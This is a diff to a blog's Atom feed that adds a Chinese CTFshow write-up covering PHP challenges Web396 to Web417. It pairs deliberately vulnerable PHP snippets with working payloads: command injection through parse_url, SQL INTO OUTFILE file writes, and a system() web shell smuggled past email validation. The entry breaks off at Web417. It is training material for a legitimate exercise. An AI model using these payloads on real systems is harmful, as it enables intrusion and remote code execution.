@@ -8,13 +8,509 @@
     <author>
       <name>Clown</name>
     </author>
-    <updated>2023-07-15T16:00:00.000Z</updated>
+    <updated>2023-07-16T16:00:00.000Z</updated>
     <category term="Clown" />
     <category term="Web" />
     <category term="Pwn" />
     <category term="CTF" />
     <category term="AWD" />
     <category term="ACM" />
+    <entry>
+        <id>https://blog.xcu.icu/2023/07/17/%E5%85%B6%E4%BB%96php%E7%AF%87/</id>
+        <title>CTFshow-其他php篇</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/17/%E5%85%B6%E4%BB%96php%E7%AF%87/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;做做靶机，刷刷 ctfshow，暑假颓废的一天，本篇记录 ctfshow 其他的 php 篇解题过程&lt;/p&gt;
+&lt;h2 id=&#34;web396&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web396&#34;&gt;#&lt;/a&gt; Web396&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&amp;gt; &#39;.$url[&#39;path&#39;]);
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;题目中说到特定函数绕过，看到源码那必然就是 parse_url 的绕过咯，下面看一下官方文档中 parse_url 函数的示例&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+$url = &#39;//www.example.com/path?googleguy=googley&#39;;
+
+// 在 5.4.7 之前这会输出路径 &amp;quot;//www.example.com/path&amp;quot;
+var_dump(parse_url($url));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091046387.png&#34; alt=&#34;image-20230716091046387&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;那么就很简单咯，这里使用反引号执行命令，将结果放到 path 指向的文件中就可以了&lt;/p&gt;
+&lt;p&gt;payload1：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?url=http://`ls`/var/www/html/1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接去访问 1.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091401261.png&#34; alt=&#34;image-20230716091401261&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;payload2：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;/?url=http://`cat%20fl0g.php`/var/www/html/1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091540195.png&#34; alt=&#34;image-20230716091540195&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web397&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web397&#34;&gt;#&lt;/a&gt; Web397&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&amp;gt; /tmp/&#39;.$url[&#39;path&#39;]);
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;比起上一题加了一点限制，路径写死在 /tmp 下面，这里简单的命令注入&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?url=http://1/1;echo%20`ls`&amp;gt;/var/www/html/1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716093947563.png&#34; alt=&#34;image-20230716093947563&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后直接读取 flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?url=http://1/1;echo%20`cat%20f*`&amp;gt;/var/www/html/1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716094031177.png&#34; alt=&#34;image-20230716094031177&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web398&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web398&#34;&gt;#&lt;/a&gt; Web398&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    if(!preg_match(&#39;/;/&#39;, $url[&#39;host&#39;]))&amp;#123;
+        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&amp;gt; /tmp/&#39;.$url[&#39;path&#39;]);
+    &amp;#125;
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;比起上一题又加了一些限制，但是限制是在 host 指向的部分，所以这里直接用上一题的 payload 即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?url=http://1/;echo%20`cat%20f*`&amp;gt;/var/www/html/1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716094835719.png&#34; alt=&#34;image-20230716094835719&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web399&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web399&#34;&gt;#&lt;/a&gt; Web399&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    if(!preg_match(&#39;/;|&amp;gt;/&#39;, $url[&#39;host&#39;]))&amp;#123;
+        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&amp;gt; /tmp/&#39;.$url[&#39;path&#39;]);
+    &amp;#125;
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还是对 host 指向的部分做限制，这里还是用上一题的 payload&lt;/p&gt;
+&lt;h2 id=&#34;web402&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web402&#34;&gt;#&lt;/a&gt; Web402&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+#error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    var_dump($url);
+    if(preg_match(&#39;/http|https/i&#39;, $url[&#39;scheme&#39;]))&amp;#123;
+        die(&#39;error&#39;);
+    &amp;#125;
+    if(!preg_match(&#39;/;|&amp;gt;|\||base/i&#39;, $url[&#39;host&#39;]))&amp;#123;
+        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&amp;gt; /tmp/&#39;.$url[&#39;path&#39;]);
+    &amp;#125;
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里的 $url [&#39;scheme&#39;] 指向的是传入 url 的协议，这里限制了是 http，并且对 host 指向做了限制，接着用上面的 payload 即可&lt;/p&gt;
+&lt;h2 id=&#34;web403&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web403&#34;&gt;#&lt;/a&gt; Web403&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    if(preg_match(&#39;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&amp;#123;3&amp;#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#39;, $url[&#39;host&#39;]))&amp;#123;
+        shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);
+    &amp;#125;
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里对 host 部分做了匹配，这里只需要构造一个 ip 即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;/?url=http://127.0.0.1/;echo `ls` &amp;gt;1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717080707237.png&#34; alt=&#34;image-20230717080707237&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着去读取 flag 即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;/?url=http://127.0.0.1/;echo `cat f*` &amp;gt;1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717080754578.png&#34; alt=&#34;image-20230717080754578&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web404&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web404&#34;&gt;#&lt;/a&gt; Web404&lt;/h2&gt;
+&lt;p&gt;这里有点搞，我一直以为环境没起来，原来是要访问 404.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    if(preg_match(&#39;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&amp;#123;3&amp;#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#39;, $url[&#39;host&#39;]))&amp;#123;
+        if(preg_match(&#39;/^\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&amp;#123;
+            shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);
+        &amp;#125;
+    &amp;#125;
+
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里 host 匹配正则改了，没有了前面的 ^, 表示前面部分就是可控的了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?url=php://;echo `ls` &amp;gt;1.txt;1.1.1.11/1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084207416.png&#34; alt=&#34;image-20230717084207416&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;用上面这个命令注入的 payload 来注入&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084257114.png&#34; alt=&#34;image-20230717084257114&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着打开这个 fl0g.php 文件即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?url=php://;echo `cat f*` &amp;gt;1.txt;1.1.1.11/1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084414005.png&#34; alt=&#34;image-20230717084414005&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web405&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web405&#34;&gt;#&lt;/a&gt; Web405&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;url&#39;]))&amp;#123;
+    $url = parse_url($_GET[&#39;url&#39;]);
+    if(preg_match(&#39;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&amp;#123;3&amp;#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#39;, $url[&#39;host&#39;]))&amp;#123;
+        if(preg_match(&#39;/^\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&amp;#123;
+            if(preg_match(&#39;/\~|\.|php/&#39;, $url[&#39;scheme&#39;]))&amp;#123;
+                shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);
+            &amp;#125;   
+        &amp;#125;
+    &amp;#125;
+&amp;#125;else&amp;#123;
+    highlight_file(__FILE__);
+    echo &#39;parse_url 好强大&#39;;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上一题的 payload 直接做就行&lt;/p&gt;
+&lt;h2 id=&#34;web406&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web406&#34;&gt;#&lt;/a&gt; Web406&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+require &#39;config.php&#39;;
+//flag in db
+highlight_file(__FILE__);
+$url=$_GET[&#39;url&#39;];
+if(filter_var ($url,FILTER_VALIDATE_URL))&amp;#123;
+    $sql = &amp;quot;select * from links where url =&#39;&amp;#123;$url&amp;#125;&#39;&amp;quot;;
+    $result = $conn-&amp;gt;query($sql);
+&amp;#125;else&amp;#123;
+    echo &#39;不通过&#39;;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这次不是 parse_url 函数了，这里使用的是 filter_var 这个过滤器，FILTER_VALIDATE_URL 这个过滤器的 ID 会将值当做 URl 来验证，很显然这题考察的就是有关 filter_var 的注入，在 url 中字符 “;”, “/”, “?”, “:”, “@”, “=” 和 “&amp;amp;” 被定义为保留字符&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717110929242.png&#34; alt=&#34;image-20230717110929242&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;结合提示 flag 在 db 中，这里因为没有回显，将查询结果写入文件中&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php 
+require &#39;config.php&#39;;
+$sql =&#39;select flag from flag into outfile &amp;quot;/var/www/html/1.txt&amp;quot;&#39;;
+$result = $conn-&amp;gt;query($sql);
+var_dump($result); 
+?&amp;gt;
+转为16进制
+?url=0://www.baidu.com;&#39;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&amp;quot;/var/www/html/1.php&amp;quot;%23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先访问 1.php，再访问 1.txt 即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717111547865.png&#34; alt=&#34;image-20230717111547865&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web407&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web407&#34;&gt;#&lt;/a&gt; Web407&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+$ip=$_GET[&#39;ip&#39;];
+
+if(filter_var ($ip,FILTER_VALIDATE_IP))&amp;#123;
+    call_user_func($ip);
+&amp;#125;
+
+class cafe&amp;#123;
+    public static function add()&amp;#123;
+        echo file_get_contents(&#39;flag.php&#39;);
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;FILTER_VALIDATE_IP 这个过滤器是验证 IP 地址的，验证成功调用了 call_user_func 来调用一个回调函数，这里只要调用 cafe 类的 add 函数即可，这里直接使用 IPV6 格式来绕过即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?ip=cafe::add
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717112553265.png&#34; alt=&#34;image-20230717112553265&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web408&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web408&#34;&gt;#&lt;/a&gt; Web408&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+$email=$_GET[&#39;email&#39;];
+
+if(filter_var ($email,FILTER_VALIDATE_EMAIL))&amp;#123;
+    file_put_contents(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个题是邮箱的一个验证，这里改一下原代码，去验证一下，传入的内容&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+$email=$_GET[&#39;email&#39;];
+
+if(filter_var ($email,FILTER_VALIDATE_EMAIL))&amp;#123;
+    var_dump(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);
+&amp;#125;
+else&amp;#123;
+    echo &amp;quot;Invalid email&amp;quot;;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717113002984.png&#34; alt=&#34;image-20230717113002984&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;简单的测试后发现 &amp;quot;&amp;quot;,&amp;quot;[]&amp;quot;,&amp;quot;()&amp;quot;和&amp;quot;&amp;lt;&amp;gt;&amp;quot; 是不能放在邮箱 @前缀中的，但是想要写马尖括号必须要使用，这里可以使用引号来绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717113710945.png&#34; alt=&#34;image-20230717113710945&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看不到是因为被识别为标签了，这里去写马 rce 即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?email=&amp;quot;&amp;lt;?=system($_GET[1])?&amp;gt;&amp;quot;@1.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717114115775.png&#34; alt=&#34;image-20230717114115775&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web409&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web409&#34;&gt;#&lt;/a&gt; Web409&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+$email=$_GET[&#39;email&#39;];
+if(filter_var ($email,FILTER_VALIDATE_EMAIL))&amp;#123;
+    $email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);
+    eval($email);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这题有个替换 flag 和他前面的字符为空，这里还是上一题的思路，因为这里是直接通过 eval 代码执行，如果用两个引号包裹会被识别为一个字符串不被执行，所以这里利用替换将前一个引号替换为空将后一个引号注释掉，可以看下面这个例子&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717115317227.png&#34; alt=&#34;image-20230717115317227&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这些知道后 payload 就很简单&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?email=&amp;quot;flagsystem($_GET[1]);//&amp;quot;@a.b&amp;amp;1=cat /flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717115914428.png&#34; alt=&#34;image-20230717115914428&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web410&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web410&#34;&gt;#&lt;/a&gt; Web410&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&#39;flag.php&#39;);
+$b=$_GET[&#39;b&#39;];
+if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&amp;#123;
+    if($b==&#39;true&#39; || intval($b)&amp;gt;0)&amp;#123;
+        die(&#39;FLAG NOT HERE&#39;);
+    &amp;#125;else&amp;#123;
+        echo $flag;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;FILTER_VALIDATE_BOOLEAN 这个过滤器验证为布尔类型，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9maWx0ZXJfdmFsaWRhdGVfYm9vbGVhbi5hc3A=&#34;&gt;PHP FILTER_VALIDATE_BOOLEAN 过滤器 (w3school.com.cn)&lt;/span&gt; 这里可以参考一下&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果是 &amp;quot;1&amp;quot;, &amp;quot;true&amp;quot;, &amp;quot;on&amp;quot; 以及 &amp;quot;yes&amp;quot;，则返回 true。&lt;/li&gt;
+&lt;li&gt;如果是 &amp;quot;0&amp;quot;, &amp;quot;false&amp;quot;, &amp;quot;off&amp;quot;, &amp;quot;no&amp;quot; 以及 &amp;quot;&amp;quot;，则返回 false。&lt;/li&gt;
+&lt;li&gt;否则返回 NULL。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这里第二个 if 判断不能为 true 也不能为 1，这里使用 yes 或者 on 就行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717120621137.png&#34; alt=&#34;image-20230717120621137&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web411&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web411&#34;&gt;#&lt;/a&gt; Web411&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&#39;flag.php&#39;);
+$b=$_GET[&#39;b&#39;];
+if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&amp;#123;
+    if($b==&#39;true&#39; || intval($b)&amp;gt;0 ||$b==&#39;on&#39; || $b==&#39;ON&#39;)&amp;#123;
+        die(&#39;FLAG NOT HERE&#39;);
+    &amp;#125;else&amp;#123;
+        echo $flag;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;和上一题一样，多了一个 no 的限制，这里使用 yes 即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717121844974.png&#34; alt=&#34;image-20230717121844974&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web412&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web412&#34;&gt;#&lt;/a&gt; Web412&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+$ctfshow=$_POST[&#39;ctfshow&#39;];
+if(isset($ctfshow))&amp;#123;
+    file_put_contents(&#39;flag.php&#39;, &#39;//&#39;.$ctfshow,FILE_APPEND);
+    include(&#39;flag.php&#39;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这题考察 file_put_contents 函数，这个中的 FILE_APPEND 防止删除原有文件内容，这里拼接进去的内容会用 // 注释掉，这里使用 %0a 绕过即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ctfshow=%0ahighlight_file(__FILE__);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717124234765.png&#34; alt=&#34;image-20230717124234765&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web413&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web413&#34;&gt;#&lt;/a&gt; Web413&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+highlight_file(__FILE__);
+
+$ctfshow=$_POST[&#39;ctfshow&#39;];
+
+if(isset($ctfshow))&amp;#123;
+        file_put_contents(&#39;flag.php&#39;, &#39;/*&#39;.$ctfshow.&#39;*/&#39;,FILE_APPEND);
+    include(&#39;flag.php&#39;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里使用 /**/ 的方法注释防止换行的绕过，只需要将前后都闭合即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;ctfshow=*/highlight_file(__FILE__);/*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717124639168.png&#34; alt=&#34;image-20230717124639168&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web414&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web414&#34;&gt;#&lt;/a&gt; Web414&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+$ctfshow=$_GET[&#39;ctfshow&#39;];
+
+if($ctfshow==true)&amp;#123;
+    if(sqrt($ctfshow)&amp;gt;=sqrt(intval($flag)))&amp;#123;
+        echo &#39;FLAG_NOT_HERE&#39;;
+    &amp;#125;else&amp;#123;
+        echo $flag;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里等于 true 没什么用，任意字符串都能满足，这里传入一个负数即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717141633657.png&#34; alt=&#34;image-20230717141633657&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web415&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web415&#34;&gt;#&lt;/a&gt; Web415&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+$k = $_GET[k];
+
+function getflag()&amp;#123;
+    echo file_get_contents(&#39;flag.php&#39;);
+&amp;#125;
+
+if($k==&#39;getflag&#39;)&amp;#123;
+    die(&#39;FLAG_NOT_HERE&#39;);
+&amp;#125;else&amp;#123;
+    call_user_func($k);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里先判断如果 k 等于 getflag 就异常退出，这里最后又要调用 getflag，这里因为使用的是两个等号判断，所以这里直接用大写绕过即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717160437167.png&#34; alt=&#34;image-20230717160437167&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web416&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web416&#34;&gt;#&lt;/a&gt; Web416&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctf&amp;#123;
+    public function getflag()&amp;#123;
+        return &#39;fake flag&#39;;
+    &amp;#125;
+    final public function flag()&amp;#123;
+        echo file_get_contents(&#39;flag.php&#39;);
+    &amp;#125;
+&amp;#125;
+
+class show extends ctf&amp;#123;
+    public function __construct($f)&amp;#123;
+        call_user_func($f);
+    &amp;#125;
+&amp;#125;
+
+echo new show($_GET[f]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里 show 类继承与 ctf 类，这里直接去调用 ctf 的 flag 方法即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717182612438.png&#34; alt=&#34;image-20230717182612438&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web417&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web417&#34;&gt;#&lt;/a&gt; Web417&lt;/h2&gt;
+&lt;p&gt;这里有一个附件先下载下来&lt;/p&gt;
